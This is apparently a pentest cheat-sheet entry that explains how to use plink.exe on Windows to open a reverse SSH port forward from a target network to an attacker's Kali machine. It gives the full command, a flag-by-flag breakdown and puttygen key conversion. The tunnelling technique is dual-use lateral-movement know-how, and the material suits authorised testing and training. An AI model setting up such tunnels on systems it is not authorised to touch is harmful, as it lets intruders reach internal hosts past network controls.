plink.exe

Windows PLink Tunnel

Plink allows an SSH-like client to allow Port Forwarding on a Windows system. Below is an example command:

~~~cmd
cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -N
~~~

Command Breakdown:

cmd.exe /c echo y - This spawns a non-interactive shell and suppresses warnings
| - pipes in a new command after the non-interactive shell and into that same shell
-R - Creates the remote port on the attacker machine
8000:172.16.0.10:80 - AttackerMachineProxyPort:TargetIP:TargetPort
kali@172.16.0.20 - AttackerUser@AttackerIP
-i KEYFILE - -i Specifies to use a Private Key and the KEYFILE is the keyfile/private key **May need to be chmod 600 on the keyfile for it to function properly
-N - only sets up the connection (no backgrounding is needed as it is running in a backgrounded non-interactive shell)

***Keys generated with ssh-keygen will not work properly with plink as plink is a part of the putty set and will require a putty generated key.
***You will need to generate a key using ssh-keygen and then convert it with puttygen. Below is an example command:

~~~cmd
puttygen KEYFILE -o OUTPUT_KEY.ppk
~~~

You will still need to add the public key to the authorized_keys file for this, but the private key used on the other system will need to become the puttygen'd key.
